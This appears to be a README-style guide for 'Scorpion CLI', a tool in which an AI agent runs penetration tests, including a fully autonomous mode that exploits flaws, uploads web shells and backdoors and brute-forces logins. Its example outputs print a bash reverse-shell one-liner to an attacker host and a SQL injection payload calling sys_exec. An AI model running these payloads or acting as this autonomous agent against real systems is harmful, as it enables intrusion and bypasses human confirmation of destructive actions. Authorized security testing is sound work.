# AI Penetration Testing Guide

**Autonomous AI-powered security testing with Scorpion CLI**

---

## Quick Start (2 Minutes)

### 1. Setup API Key

```bash
# Get FREE GitHub Models token: https://github.com/marketplace/models
export SCORPION_AI_API_KEY='ghp_your_token_here'

# Or use .env file
echo "SCORPION_AI_API_KEY=ghp_your_token" >> .env
```

### 2. Run Your First AI Pentest

```bash
# Basic scan (auto-detects provider from API key!)
scorpion ai-pentest -t example.com

# Scan any target (with authorization)
scorpion ai-pentest -t yourtarget.com

# The AI will perform:
# - Reconnaissance (DNS, WHOIS, tech detection)
# - Port scanning and service enumeration
# - OS fingerprinting
# - Vulnerability discovery
# - Auto-generate test payloads for every vulnerability found
# - Provide code-level remediation with secure code examples
# - Analyze tech stack to provide framework-specific fixes
# - Generate detailed report with PoC steps

# Works with any target (with proper authorization):
# - Public domains, private networks, localhost
# - yourtarget.com, api.yourtarget.com
# - 192.168.x.x (local network)
# - localhost:3000, localhost:8080 (development servers)
# See: LOCALHOST_SCANNING_GUIDE.md

# AGGRESSIVE MODE - Actually exploit and gain shell (AUTHORIZED ONLY!)
scorpion ai-pentest -t example.com -r high -g gain_shell_access

# [WARNING] AI will ACTIVELY:
# [EXPLOIT] Exploit discovered vulnerabilities
# [EXPLOIT] Generate and execute reverse shell payloads
# [EXPLOIT] Attempt file upload exploits
# [EXPLOIT] Bruteforce weak credentials
# [EXPLOIT] Gain actual shell access, NOT just report findings!
```

---

## Testing Goals

### Comprehensive Assessment (Default)
```bash
scorpion ai-pentest -t example.com -g comprehensive_assessment
```
- Full reconnaissance
- Port scanning (1-1024)
- Service enumeration
- Vulnerability discovery
- Technology detection
- SSL/TLS analysis

### Vulnerability Discovery
```bash
scorpion ai-pentest -t example.com -g vulnerability_discovery -r high
```
- OWASP Top 10 testing (SQLi, XSS, RCE, SSRF)
- Directory busting
- Parameter fuzzing
- API security testing
- Default credential checks
- Nuclei CVE scanning

### Shell Access - AGGRESSIVE EXPLOITATION (AUTHORIZED ONLY!)
```bash
scorpion ai-pentest -t target.com -g gain_shell_access -r high -a fully_autonomous
```
[WARNING] **Requires explicit written authorization!**

[AGGRESSIVE MODE] **This is NOT passive vulnerability scanning!**

AI will ACTIVELY EXPLOIT and GAIN REAL SHELL ACCESS:
- Find command injection → **EXPLOIT IT** → Get shell
- Find RCE vulnerability → **EXPLOIT IT** → Get shell  
- Find file upload flaw → **UPLOAD SHELL** → Get access
- Find weak credentials → **BRUTEFORCE** → Login and escalate
- Find SQLi → **INJECT PAYLOADS** → Execute OS commands
- Generate reverse shell payloads → **EXECUTE THEM**
- Upload web shells (PHP/JSP/ASPX) → **GET INTERACTIVE ACCESS**
- Exploit services (SSH/RDP/FTP) → **GAIN REMOTE ACCESS**

**This is RED TEAM mode - AI will attempt to compromise the system, not just document issues!**

### Web Exploitation
```bash
scorpion ai-pentest -t webapp.com -g web_exploitation -r medium
```
- SQL injection (error-based, boolean, time-based)
- Cross-site scripting (reflected, stored, DOM)
- SSRF (Server-Side Request Forgery)
- XXE (XML External Entity)
- SSTI (Server-Side Template Injection)
- Authentication bypass
- Authorization flaws (IDOR, privilege escalation)

### Infrastructure Assessment
```bash
scorpion ai-pentest -t target.com -g infrastructure_assessment
```
- Deep port scanning (1-65535)
- UDP service discovery
- Cloud storage audits (S3, Azure, GCP)
- Kubernetes API exposure
- Container registry security
- Network topology mapping

---

## Configuration Options

### Risk Tolerance
```bash
# Low - Passive reconnaissance only (NO exploitation)
scorpion ai-pentest -t example.com -r low
# → Only lists findings, never exploits

# Medium - Active scanning, NO exploitation (DEFAULT)
scorpion ai-pentest -t example.com -r medium
# → Tests vulnerabilities but does NOT exploit
# → Reports SQLi, XSS, RCE but won't execute payloads

# High - ACTIVE EXPLOITATION (requires authorization)
scorpion ai-pentest -t example.com -r high -g gain_shell_access
# → ACTUALLY EXPLOITS vulnerabilities
# → Generates and executes payloads to gain shell
# → Uploads web shells and backdoors
# → This is REAL penetration testing, not just scanning!
```

### Autonomy Level
```bash
# Supervised - Asks permission before each action
scorpion ai-pentest -t example.com -a supervised

# Semi-Autonomous - Asks before high-risk actions (DEFAULT)
scorpion ai-pentest -t example.com -a semi_autonomous

# Fully Autonomous - No confirmation prompts
scorpion ai-pentest -t example.com -a fully_autonomous -r high
```

### Stealth Level
```bash
# Low - Fast, aggressive (noisy)
scorpion ai-pentest -t example.com -s low

# Moderate - Balanced (DEFAULT)
scorpion ai-pentest -t example.com -s moderate

# High - Slow, evasive (stealthy)
scorpion ai-pentest -t example.com -s high
```

### Time Limit
```bash
# Short scan (default: 15 minutes)
scorpion ai-pentest -t example.com --time-limit 15

# Extended scan (60 minutes)
scorpion ai-pentest -t example.com --time-limit 60 -g comprehensive_assessment
```

---

## AI Provider Options

### Auto-Detection (Recommended)
```bash
# GitHub Models (FREE) - API key starts with ghp_
export SCORPION_AI_API_KEY='ghp_...'
scorpion ai-pentest -t example.com

# OpenAI - API key starts with sk-proj- or sk-
export SCORPION_AI_API_KEY='sk-proj-...'
scorpion ai-pentest -t example.com

# Anthropic Claude - API key starts with sk-ant-
export SCORPION_AI_API_KEY='sk-ant-...'
scorpion ai-pentest -t example.com
```

### Manual Provider Selection
```bash
# GitHub Models with specific model
scorpion ai-pentest -t example.com --ai-provider github --model gpt-4o

# OpenAI GPT-4
scorpion ai-pentest -t example.com --ai-provider openai --model gpt-4

# Anthropic Claude Sonnet
scorpion ai-pentest -t example.com --ai-provider anthropic --model claude-3-sonnet-20240229

# Custom OpenAI-compatible endpoint (local LLM)
scorpion ai-pentest -t example.com \
  --ai-provider custom \
  --api-endpoint http://localhost:1234/v1/chat/completions \
  --api-key local
```

---

## What the AI Does

### Phase 1: Reconnaissance (Iterations 1-3)
```
- DNS enumeration (A, AAAA, MX, TXT, NS records)
- WHOIS lookup (registration info)
- Subdomain discovery
- Technology detection (frameworks, CMS, CDN, WAF)
- OS fingerprinting
```

### Phase 2: Scanning & Enumeration (Iterations 4-7)
```
- Port scanning (TCP/UDP)
- Service version detection
- Banner grabbing
- Web crawling (endpoints, API paths)
- Directory busting (admin panels, backups)
- SSL/TLS analysis
```

### Phase 3: Vulnerability Discovery (Iterations 8-12)
```
- Web application testing (SQLi, XSS, RCE, SSRF, XXE, SSTI)
- API security testing
- Parameter fuzzing
- Authentication testing
- Subdomain takeover checks
- Cloud misconfiguration audits
- Nuclei CVE scanning
- AUTO-GENERATE test payloads for EVERY vulnerability
- AUTO-GENERATE secure code fixes with remediation
- ANALYZE tech stack for framework-specific solutions
```

### Phase 4: ACTIVE EXPLOITATION (Iterations 13-16, HIGH RISK ONLY)
```
- Credential bruteforce → GAIN ACCESS to SSH/FTP/HTTP/databases
- Command injection → EXECUTE OS COMMANDS → Deploy reverse shell
- File upload vulnerability → UPLOAD WEB SHELL → Get interactive access
- SQL injection → EXECUTE xp_cmdshell/sys_exec → OS command execution
- RCE vulnerability → GENERATE PAYLOAD → Execute for shell access
- Unrestricted file upload → UPLOAD BACKDOOR → Persistent access
- Weak/default creds → LOGIN → Escalate privileges → Deploy persistence

[WARNING] AI DOES NOT stop at "Found SQLi" - it EXPLOITS to gain shell!
[WARNING] AI DOES NOT just report - it ACTIVELY COMPROMISES the system!
[WARNING] This is OFFENSIVE security, not defensive scanning!
```

### Phase 5: Post-Exploitation (Iterations 17+, HIGH RISK ONLY)
```
- Privilege escalation enumeration
- Sensitive data discovery
- Internal network mapping
- Persistence mechanisms
```

---

## Real-World Examples

### Example 1: Quick Security Assessment
```bash
# 5-minute security check
scorpion ai-pentest -t mywebsite.com --time-limit 5

# Output:
# [OK] Found 3 open ports (80, 443, 22)
# [OK] Detected Apache 2.4.52 (Ubuntu)
# [WARNING] TLS 1.0 enabled (MEDIUM severity)
# [OK] No critical vulnerabilities
```

### Example 2: Deep Vulnerability Scan
```bash
# 30-minute comprehensive scan
scorpion ai-pentest -t webapp.com \
  -g vulnerability_discovery \
  -r high \
  --time-limit 30

# AI will:
# 1. Scan all ports (1-65535)
# 2. Crawl entire website
# 3. Test all discovered endpoints
# 4. Fuzzing parameters for injection
# 5. Run Nuclei for known CVEs
# 6. Bruteforce common paths
# 7. Generate detailed report
```

### Example 3: Authorized Red Team Exercise - AGGRESSIVE EXPLOITATION
```bash
# Full exploitation (with authorization letter!)
scorpion ai-pentest -t authorized-target.com \
  -g gain_shell_access \
  -r high \
  -a fully_autonomous \
  --time-limit 60

# AI will ACTIVELY ATTACK to gain shell:
# 1. Enumerate all services
# 2. Test default credentials → LOGIN if found
# 3. Bruteforce authentication → GAIN ACCESS
# 4. Find SQLi → INJECT commands → EXECUTE reverse shell
# 5. Find file upload → UPLOAD PHP/JSP shell → GET WEBSHELL
# 6. Find RCE → GENERATE payload → EXECUTE for shell
# 7. Setup listener → CATCH reverse shell → INTERACTIVE ACCESS
# 8. NOT just a report - you get ACTUAL SHELL ACCESS!

# Example Output:
# [FOUND] SQLi in /login?user=
# [EXPLOIT] Exploiting SQLi to execute OS commands...
# [EXPLOIT] Uploading reverse shell payload...
# [EXPLOIT] Executing: bash -i >& /dev/tcp/attacker/4444 0>&1
# [SUCCESS] SHELL OBTAINED! Connected on port 4444
# [COMPROMISED] System compromised - root@target:/#
```

### Example 4: API Security Testing
```bash
# Test API endpoints
scorpion ai-pentest -t api.example.com \
  -g api_security_testing \
  -r medium

# AI will:
# 1. Discover API endpoints
# 2. Test authentication mechanisms
# 3. Check for IDOR vulnerabilities
# 4. Test authorization controls
# 5. Fuzzing API parameters
# 6. Rate limit testing
```

---

## AI Decision Making

The AI agent makes intelligent decisions based on:
2. **Testing Goal:** Aligns actions with primary objective
3. **Risk Tolerance:** Respects configured safety boundaries
4. **Time Budget:** Prioritizes high-impact actions
5. **Stealth Requirements:** Adapts to detection risk
6. **Tool Chaining:** Logically sequences testing phases

**Example Decision Chain - EXPLOITATION IN ACTION:**
```
1. recon → Discovers subdomains and technologies
2. port_scan → Finds open port 8080 (Tomcat)
3. web_pentest → Detects file upload without validation
4. payload_generate → Creates JSP web shell payload
5. exploit_vuln → UPLOADS shell.jsp to /uploads/
6. execute_command → ACCESSES http://target:8080/uploads/shell.jsp
7. [SUCCESS] RESULT: Interactive web shell obtained!
8. post_exploit → Enumerates system, escalates privileges

Another Real Example:
1. web_pentest → Finds SQLi in /api/users?id=1
2. exploit_vuln → Injects: 1' UNION SELECT sys_exec('whoami')--
3. payload_generate → Creates: bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
4. exploit_vuln → Executes via SQLi to spawn reverse shell
5. [SUCCESS] RESULT: Root shell obtained, system compromised!
```

---

## Report Output

AI pentest generates comprehensive JSON report:

```json
{
  "summary": {
    "target": "example.com",
    "primary_goal": "comprehensive_assessment",
    "duration_minutes": 12.5,
    "iterations": 10,
    "total_findings": 15,
    "ai_provider": "github",
    "ai_model": "gpt-4o-mini"
  },
  "findings_by_severity": {
    "critical": 1,
    "high": 3,
    "medium": 5,
    "low": 4,
    "info": 2
  },
  "detailed_findings": [
    {
      "timestamp": "2025-12-12T10:30:45",
      "tool": "web_pentest",
      "severity": "critical",
      "category": "web_application",
      "description": "SQL Injection in /login endpoint",
      "exploitation_potential": "critical",
      "recommended_action": "Use parameterized queries"
    }
  ],
  "recommendations": [
    "[URGENT] Address 1 critical vulnerability",
    "[HIGH PRIORITY] Fix 3 high-severity issues"
  ]
}
```

**View report:**
```bash
cat ai_pentest_example.com_20251212_083908.json | jq .summary
```

---

## Safety & Legal

### CRITICAL WARNINGS

1. **Authorization Required:** NEVER scan systems without explicit written permission
2. **Legal Consequences:** Unauthorized testing is illegal in most jurisdictions
3. **Ethical Boundaries:** Respect privacy, data protection laws, and ToS
4. **High-Risk Actions:** Exploitation requires risk_tolerance=HIGH and authorization
5. **No Liability:** Use at your own risk, authors not responsible for misuse

### EXPLOITATION MODE WARNING

**When you use `-r high -g gain_shell_access`, the AI will:**
- NOT just scan and report vulnerabilities
- ACTIVELY EXPLOIT found vulnerabilities
- EXECUTE payloads to gain shell access
- UPLOAD backdoors and web shells
- BRUTEFORCE authentication if needed
- COMPROMISE the target system

**This is REAL offensive hacking, not passive scanning!**

**You MUST have:**
- Written authorization from system owner
- Clear scope definition
- Legal indemnification
- Incident response plan

**Do NOT use exploitation mode on:**
- Systems you don't own
- Production systems without approval
- Shared hosting environments
- Any system without explicit permission

### Best Practices

- Always get written authorization before testing
- Start with low risk tolerance (-r low)
- Use stealth mode on production systems (-s high)
- Review findings before exploitation
- Keep API keys secure (.env in .gitignore)
- Document your scope and authorization
- Follow responsible disclosure practices

---

## Comparison: Manual vs AI Pentest

| Task | Manual Testing | AI Pentest |
|------|---------------|-----------|
| **Port Scan** | Run nmap command | Automatic |
| **Service Enum** | Manual banner grab | Automatic |
| **Vuln Discovery** | Research CVEs | AI analyzes findings |
| **Tool Selection** | Choose next tool | AI decides strategy |
| **Exploitation** | Manual payload crafting | AI generates AND EXECUTES payloads |
| **Shell Access** | Manual exploitation → shell | AI auto-exploits → shell (high risk) |
| **Report Writing** | Hours of documentation | Instant JSON report + PROOF |
| **Time** | Days/weeks | Minutes/hours |
| **Cost** | Expensive consultant | FREE with GitHub Models |

---

## Pro Tips

### Tip 1: Use GitHub Models (FREE!)
```bash
# No cost, no credit card required
# Get token: https://github.com/marketplace/models
export SCORPION_AI_API_KEY='ghp_your_github_token'
scorpion ai-pentest -t example.com
# Cost: $0.00
```

### Tip 2: Start Conservative, Scale Up
```bash
# Start passive
scorpion ai-pentest -t example.com -r low

# Review findings, then increase
scorpion ai-pentest -t example.com -r medium

# If authorized, go aggressive
scorpion ai-pentest -t example.com -r high -g gain_shell_access
```

### Tip 3: Focus on Specific Goals
```bash
# Don't use comprehensive_assessment for everything
# Be specific:
-g vulnerability_discovery  # Find bugs
-g web_exploitation        # Test web apps
-g infrastructure_assessment  # Network security
-g api_security_testing    # API testing
```

### Tip 4: Use Learning Mode
```bash
# Watch AI decision-making process
scorpion ai-pentest -t example.com --learning-mode

# AI explains:
# - Why it chose each tool
# - What it learned from findings
# - Strategic reasoning
```

### Tip 5: Combine with Manual Tools
```bash
# Run AI pentest first for reconnaissance
scorpion ai-pentest -t example.com -r low --time-limit 10

# Use findings to guide manual testing
# AI found SQL injection? → Test manually with sqlmap
# AI found open ports? → Deep dive with nmap -A
```

---

## Troubleshooting

### "API key required"
```bash
# Check if key is loaded
echo $SCORPION_AI_API_KEY

# If empty, set it:
export SCORPION_AI_API_KEY='your_key_here'
```

### "401 Unauthorized"
- GitHub token expired → Regenerate at https://github.com/settings/tokens
- OpenAI key invalid → Check at https://platform.openai.com/api-keys

### "Rate limit exceeded"
- GitHub Models: Wait 1 minute (15-60 requests/min limit)
- OpenAI: Check usage at https://platform.openai.com/usage
- Solution: Use --time-limit to slow down, or wait

### "No findings"
- Target may be well-secured (good!)
- Increase --time-limit for deeper testing
- Try different goals (-g vulnerability_discovery)
- Use higher risk tolerance (-r high) if authorized

---

## Additional Resources

- **Localhost Scanning:** [LOCALHOST_SCANNING_GUIDE.md](LOCALHOST_SCANNING_GUIDE.md) - Test your local apps safely
- **Test Payload & Code Analysis:** [AI_PAYLOAD_TESTING_GUIDE.md](AI_PAYLOAD_TESTING_GUIDE.md) - Auto-generated payloads & remediation
- **Exploitation Implementation:** [EXPLOITATION_IMPLEMENTATION.md](EXPLOITATION_IMPLEMENTATION.md) - How exploitation works
- **Setup Guide:** [AI_SETUP_GUIDE.md](AI_SETUP_GUIDE.md)
- **Main README:** [README.md](README.md)
- **Command Reference:** [COMMANDS.md](COMMANDS.md)
- **GitHub Models:** https://github.com/marketplace/models

---

## Learning Path

### Beginner
1. Run reconnaissance scan: `-r low`
2. Review JSON report
3. Understand finding severities
4. Learn about discovered vulnerabilities

### Intermediate
1. Test vulnerability discovery: `-g vulnerability_discovery -r medium`
2. Analyze AI decision-making
3. Verify findings manually
4. Practice remediation recommendations

### Advanced
1. Authorized exploitation: `-g gain_shell_access -r high`
2. Chain multiple testing goals
3. Integrate with other tools (Burp, Metasploit)
4. Custom payload development

---

**Remember:** With great power comes great responsibility. Use ethically!

---

**Last Updated:** December 11, 2025  
**Version:** 2.0.2
